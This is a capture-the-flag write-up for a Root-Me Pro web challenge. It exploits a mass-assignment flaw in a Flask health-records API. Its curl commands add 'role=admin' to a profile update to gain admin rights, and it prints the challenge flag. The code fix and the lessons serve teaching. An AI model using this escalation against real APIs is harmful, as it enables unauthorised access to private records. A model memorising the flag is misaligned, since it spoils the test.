# API - Mass Assignment — Root-Me Pro

| | |
|---|---|
| **Challenge** | API - Mass Assignment |
| **Platform** | Root-Me Pro |
| **Category** | Web / API |
| **Difficulty** | Easy — 200 points (~30 min) |
| **Flag** | `RM{880b92753b79ce8a6a5e642d9012a527}` |

> *Discover eHealth, your digital health platform for modern medical monitoring! Patients and doctors use it to store and exchange information. You can enter your medical information on your profile to facilitate your family doctor's work.*

The subtitle on the challenge card is the hint: **HTTP 200 Resource updated successfully**.

---

## Approach

### 1. Fingerprint

`Server: Werkzeug/3.1.3 Python/3.12.11` → a Flask app. `/robots.txt` 404s and the
only custom JS (`/static/js/custom/script.js`) is navbar cosmetics.

The HTML forms reveal the API surface:

| Endpoint | Fields |
|---|---|
| `POST /api/register` | `username`, `password`, `full_name`, `date_of_birth`, `blood_type` |
| `POST /api/login` | `username`, `password` |
| `POST /api/update-profile` | `allergies`, `medications` |

Auth is a JWT in a `token` cookie (HS256). After logging in, the payload decodes to:

```json
{"id": 2, "username": null, "role": "patient"}
```

A `role` claim controlled server-side — that's the thing to attack.

### 2. Find the win condition

`/dashboard` inlines a `fetch()` for the logged-in user's own record and branches
on the role:

```js
fetch(`/api/patients/2`)
  .then(r => r.json())
  .then(data => {
      if (data.role === 'admin') {
          // ... <strong>Secret Note:</strong> <code>${data.secret_note}</code>
      } else {
          // ... ordinary medical record
      }
  });
```

So the server only emits a `secret_note` field for records whose role is `admin`.
The flag is that field.

Worth noting what *isn't* the bug: `/api/patients/<id>` is properly authorised.
Requesting ids 1 or 3 returns `{"error":"Access denied - You can only view your
own record"}`. There's no IDOR — the only way to a `secret_note` is to make **your
own** record admin.

### 3. The gotcha — a JSON body is silently ignored

First attempt, injecting `role` as JSON:

```bash
curl -b cj.txt -X POST "$B/api/update-profile" \
     -H 'Content-Type: application/json' \
     -d '{"allergies":"None known","medications":"None","role":"admin"}'
```

Response: `302 -> /dashboard`. Looks like success. It isn't — re-reading the record:

```json
{ "allergies": "", "medications": "", "role": "patient", ... }
```

Both legitimate fields came back **empty**. That blanking is the diagnostic: the
handler reads `request.form`, which does not parse a JSON body, so every lookup
returned empty and overwrote the stored values. The 302 was meaningless.

The same mistake explains why my account had `patient_name: null`,
`blood_type: null` and a JWT carrying `"username": null` — I'd registered with a
JSON body too, so none of those fields were ever stored.

### 4. Exploit

Same request, form-encoded, with `role` riding along:

```bash
curl -b cj.txt -c cj.txt -X POST "$B/api/update-profile" \
     -d 'allergies=Penicillin&medications=None&role=admin'
```

The server re-issued the JWT immediately:

```
set-cookie: token=eyJ...eyJpZCI6MiwidXNlcm5hbWUiOm51bGwsInJvbGUiOiJhZG1pbiJ9...
                        └─ {"id":2,"username":null,"role":"admin"}
```

And the record now carries the admin-only field:

```bash
curl -b cj.txt "$B/api/patients/2"
```

```json
{
    "id": 2,
    "role": "admin",
    "allergies": "Penicillin",
    "insurance_number": "INS-0002",
    "secret_note": "RM{880b92753b79ce8a6a5e642d9012a527}",
    "status": "Active"
}
```

---

## Vulnerability

**Mass assignment** (OWASP API3:2019 — *Excessive Data Exposure / Object Property
Level Authorization*).

`POST /api/update-profile` takes the submitted form dictionary and applies **every**
key to the backing user object, rather than picking out the two fields the form is
supposed to edit. In Flask this is the classic:

```python
for key, value in request.form.items():
    setattr(user, key, value)      # role included
```

The `role` attribute is a privilege boundary, but nothing distinguishes it from
`allergies` at assignment time. Because the app then rebuilds the session JWT from
the mutated object, a single request escalates the account for all subsequent
requests too.

I checked whether `/api/register` had the same flaw — **it does not**. Registering
with `role=admin` appended yields a new user with `"role": "patient"`; that endpoint
hardcodes the role. `update-profile` is the sole vulnerable handler.

**Fix:** whitelist the assignable fields.

```python
ALLOWED = {"allergies", "medications"}
for key in ALLOWED & request.form.keys():
    setattr(user, key, request.form[key])
```

---

## Solution (minimal reproduction)

```bash
B=https://<instance>.challenges.root-me.pro

# 1. Register (form-encoded — a JSON body is silently dropped)
curl -X POST "$B/api/register" \
     -d 'username=pauk&password=Passw0rd123&full_name=Pauk&date_of_birth=1999-01-01&blood_type=O%2B'

# 2. Log in, keep the token cookie
curl -c cj.txt -X POST "$B/api/login" -d 'username=pauk&password=Passw0rd123'

# 3. Mass assignment — role rides along with the legitimate fields
curl -b cj.txt -c cj.txt -X POST "$B/api/update-profile" \
     -d 'allergies=Penicillin&medications=None&role=admin'

# 4. Read your own record; secret_note appears only for role=admin
curl -b cj.txt "$B/api/patients/2"
```

`solve.sh` in this folder automates the whole chain (it recovers the patient id by
decoding the JWT rather than hardcoding `2`). It was written after the challenge
instance expired, so it has not been run end-to-end against a live target — the
curl sequence above is what actually produced the flag.

---

## Flag

```
RM{880b92753b79ce8a6a5e642d9012a527}
```

---

## Lesson

1. **Read the client-side code for the win condition.** The dashboard JS spelled out
   exactly which field the flag lived in (`secret_note`) and exactly what unlocked it
   (`data.role === 'admin'`). That turned an open-ended "escalate somehow" into a
   concrete goal before sending a single attack request.

2. **A 2xx/3xx is not proof the request did what you wanted.** The JSON attempt
   returned 302 and *looked* fine while actually wiping two fields. Always re-read
   the resource and diff it against what you expected. Here the empty strings
   fingerprinted the parser: `request.form` vs `request.get_json()`.

3. **Match the content type the endpoint actually parses.** Flask's `request.form`
   only reads `application/x-www-form-urlencoded` / `multipart`. An API that looks
   JSON-ish because its routes start with `/api/` may still be form-driven — the
   HTML `<form method="post">` pointing straight at it was the clue.

4. **Probe every write endpoint for mass assignment separately.** I assumed register
   shared the bug; it didn't. Verifying that took one request and kept a wrong claim
   out of the writeup. Where mass assignment exists, try the privileged field names
   you saw elsewhere in the app — here `role` came straight from the JWT payload.

5. **Note the JWT re-issue.** Because the token was rebuilt from the mutated object,
   escalation persisted across requests with no token forging needed. When a server
   hands you a fresh token after a write, check what changed inside it.
